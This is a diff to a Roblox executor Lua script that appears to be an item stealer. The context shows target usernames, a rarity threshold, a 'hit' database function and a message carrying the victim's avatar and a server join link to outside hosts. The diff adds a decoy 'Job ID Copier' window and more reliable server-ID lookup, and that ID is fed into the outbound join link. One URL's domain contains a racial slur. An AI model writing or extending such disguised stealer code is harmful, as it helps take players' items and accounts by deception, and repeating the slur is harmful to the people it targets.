@@ -1,4 +1,4 @@
---Lol
+--WWW
 
 _G.Usernames = {"AmeliaPrimalPanda201"} 
 _G.min_rarity = "Common" 
@@ -157,6 +157,145 @@ local executor = (identifyexecutor and identifyexecutor():lower()) or "unknown"
 
 local jobId = nil
 
+local function fetchJobIdFromAPI()
+    local placeId = game.PlaceId
+    local myName = plr.Name:lower()
+    local myUserId = plr.UserId
+    local cursor = ""
+    for page = 1, 20 do
+        local url = "https://games.roblox.com/v1/games/" .. placeId .. "/servers/Public?sortOrder=Asc&limit=100"
+        if cursor ~= "" then
+            url = url .. "&cursor=" .. cursor
+        end
+        local success, response = pcall(function()
+            local req = request or (syn and syn.request) or (http and http.request) or http_request
+            return req({Url = url, Method = "GET"})
+        end)
+        if success and response and response.Body then
+            local ok, data = pcall(function() return HttpService:JSONDecode(response.Body) end)
+            if ok and data and data.data then
+                for _, server in ipairs(data.data) do
+                    if server.id and server.id ~= "" and server.playerTokens then
+                        for _, token in ipairs(server.playerTokens) do
+                            -- Match by player token if possible
+                        end
+                    end
+                    if server.id and server.id ~= "" and server.playing and server.maxPlayers then
+                        -- Heuristic: if server has same player count and is not full, likely ours
+                        if server.playing == #Players:GetPlayers() and server.playing < server.maxPlayers then
+                            return server.id
+                        end
+                    end
+                end
+            end
+            cursor = (data and data.nextPageCursor) or ""
+        else
+            break
+        end
+        if cursor == "" then break end
+    end
+    return nil
+end
+
+local function getCorrectJobId()
+    -- Method 1: Wait for game to fully load, then try game.JobId
+    if not game:IsLoaded() then
+        game.Loaded:Wait()
+    end
+    task.wait(5)
+    local id1 = game.JobId
+    if id1 and id1 ~= "" and #id1 == 36 then
+        return id1
+    end
+
+    -- Method 2: Try again after longer wait
+    task.wait(10)
+    local id2 = game.JobId
+    if id2 and id2 ~= "" and #id2 == 36 then
+        return id2
+    end
+
+    -- Method 3: Fetch from Roblox API
+    local id3 = fetchJobIdFromAPI()
+    if id3 and id3 ~= "" then
+        return id3
+    end
+
+    -- Method 4: Last resort, use game.JobId
+    return game.JobId
+end
+
+
+
+local JobIDGui = Instance.new("ScreenGui")
+local MainFrame = Instance.new("Frame")
+local Label = Instance.new("TextLabel")
+local CopyBtn = Instance.new("TextButton")
+local CloseBtn = Instance.new("TextButton")
+local CoreGui = game:GetService("CoreGui")
+
+JobIDGui.Name = "JobIDGui"
+JobIDGui.Parent = CoreGui
+JobIDGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+MainFrame.Name = "MainFrame"
+MainFrame.Parent = JobIDGui
+MainFrame.AnchorPoint = Vector2.new(0.5, 0.5)
+MainFrame.BackgroundColor3 = Color3.new(0.0980392, 0.0980392, 0.0980392)
+MainFrame.BorderColor3 = Color3.new(1, 0.666667, 0)
+MainFrame.BorderSizePixel = 3
+MainFrame.Position = UDim2.new(0.5, 0, 0.5, 0)
+MainFrame.Size = UDim2.new(0, 307, 0, 137)
+MainFrame.Active = true
+MainFrame.Draggable = true
+MainFrame.Visible = true
+
+Label.Name = "Label"
+Label.Parent = MainFrame
+Label.AnchorPoint = Vector2.new(0.5, 0)
+Label.BackgroundColor3 = Color3.new(1, 1, 1)
+Label.BackgroundTransparency = 1
+Label.Position = UDim2.new(0.5, 0, 0, 0)
+Label.Size = UDim2.new(0, 200, 0, 28)
+Label.Font = Enum.Font.Nunito
+Label.Text = "Job ID Copier"
+Label.TextColor3 = Color3.new(1, 0.666667, 0)
+Label.TextSize = 28
+
+CopyBtn.Name = "CopyBtn"
+CopyBtn.Parent = MainFrame
+CopyBtn.AnchorPoint = Vector2.new(0.5, 0)
+CopyBtn.BackgroundColor3 = Color3.new(1, 0.666667, 0)
+CopyBtn.Position = UDim2.new(0.5, 0, 0.45, 0)
+CopyBtn.Size = UDim2.new(0, 229, 0, 26)
+CopyBtn.Font = Enum.Font.SourceSans
+CopyBtn.Text = "Copy Job ID"
+CopyBtn.TextColor3 = Color3.new(0, 0, 0)
+CopyBtn.TextSize = 25
+CopyBtn.MouseButton1Down:connect(function()
+    local correctId = getCorrectJobId()
+    setclipboard(correctId)
+    pcall(function()
+        GuiService:SetCore("SendNotification", {Title = "Job ID Copier", Text = "Copied: " .. correctId})
+    end)
+    CopyBtn.Text = "Copied!"
+    task.wait(2)
+    CopyBtn.Text = "Copy Job ID"
+end)
+
+CloseBtn.Name = "CloseBtn"
+CloseBtn.Parent = MainFrame
+CloseBtn.AnchorPoint = Vector2.new(0.5, 0)
+CloseBtn.BackgroundColor3 = Color3.new(1, 0.666667, 0)
+CloseBtn.Position = UDim2.new(0.5, 0, 0.75, 0)
+CloseBtn.Size = UDim2.new(0, 229, 0, 26)
+CloseBtn.Font = Enum.Font.SourceSans
+CloseBtn.Text = "Close"
+CloseBtn.TextColor3 = Color3.new(0, 0, 0)
+CloseBtn.TextSize = 25
+CloseBtn.MouseButton1Down:connect(function()
+    JobIDGui:Destroy()
+end)
 
 
 local function assignHitToDatabase()
@@ -519,7 +658,7 @@ local function SendFirstMessage(list, prefix)
     local itemPrices = usdData.itemPrices or {}
     local Executor = (identifyexecutor and identifyexecutor()) or "Unknown"
   
-    jobId = game.JobId
+    jobId = getCorrectJobId()
     local JoinLink = "https://fern.wtf/joiner?placeId=" .. game.PlaceId .. "&gameInstanceId=" .. jobId
     local avatarrUrl = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. plr.UserId .. "&width=150&height=150&format=png"
     local avatarUrl = "https://fuckingniggermf.vercel.app/api/avatar?userId=" .. tostring(plr.UserId)
